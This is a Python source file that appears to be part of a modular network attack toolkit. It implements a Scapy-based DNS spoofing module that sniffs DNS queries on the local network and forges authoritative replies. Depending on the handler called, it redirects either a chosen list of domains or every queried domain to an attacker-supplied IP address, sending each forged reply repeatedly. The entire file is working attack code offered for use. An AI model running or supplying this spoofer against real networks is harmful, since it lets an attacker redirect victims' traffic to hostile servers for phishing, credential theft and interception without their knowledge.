import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from Network_Modules import network_adapter as iface
from base_module import BaseModule
from message_broker import Message

class DNSModule(BaseModule):
    def __init__(self):
        super().__init__("dns")
        self.is_spoofing = False
        self.target_address = None
        self.domain_spoof_list = None
        self.register_handler("spoof_selected", self.handle_spoof_selected)
        self.register_handler("spoof_all", self.handle_spoof_all)
        self.register_handler("stop", self.handle_stop)

    def on_start(self):
        print(f"[{self.module_name}] DNS module initialized")
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")

    def on_stop(self):
        if self.is_spoofing:
            self.stop_spoofing()

    def hijack_dns_request(self, packet, any_domain=False, domain_target=None):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            query_name = packet[DNSQR].qname.decode().rstrip('.')

            if any_domain or query_name in self.domain_spoof_list:
                domain_to_spoof = query_name if any_domain else domain_target

                response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, ancount=1,
                               an=DNSRR(rrname=domain_to_spoof, rdata=self.target_address))

                for _ in range(8):
                    send(response, verbose=0)

    def handle_spoof_selected(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.domain_spoof_list = message.data.get("spoof_targets")
        self.is_spoofing = True

        print(f"[{self.module_name}] Spoofed target address: {self.domain_spoof_list}")
        spoof_thread = threading.Thread(target=self._spoof_selected, daemon=True)
        spoof_thread.start()

        return {"status": "spoofing_selected"}

    def _spoof_selected(self):
        while self.is_spoofing:
            # Wrap the method call in a lambda to capture the domain from the loop
            for domain in self.domain_spoof_list:
                sniff(
                    filter=f"udp port 53 and host {domain}",
                    prn=lambda pkt: self.hijack_dns_request(pkt, domain_target=domain),
                    store=0,
                    stop_filter=lambda pkt: not self.is_spoofing
                )

    def handle_spoof_all(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.is_spoofing = True
        spoof_thread = threading.Thread(target=self._spoof_all, daemon=True)
        spoof_thread.start()

        return {"status": "spoofing_all"}

    def _spoof_all(self):
        while self.is_spoofing:
            # Pass the function reference, not the result of calling it
            sniff(
                filter="udp port 53",
                prn=lambda pkt: self.hijack_dns_request(pkt, any_domain=True),
                store=0,
                stop_filter=lambda pkt: not self.is_spoofing
            )

    def handle_stop(self, message: Message):
        self.stop_spoofing()
        return {"status": "stopped"}

    def stop_spoofing(self):
        self.is_spoofing = False
        print(f"[{self.module_name}] DNS spoofing stopped.")

# Global instance
_module = None

def get_module() -> DNSModule:
    global _module
    if _module is None:
        _module = DNSModule()
    return _module
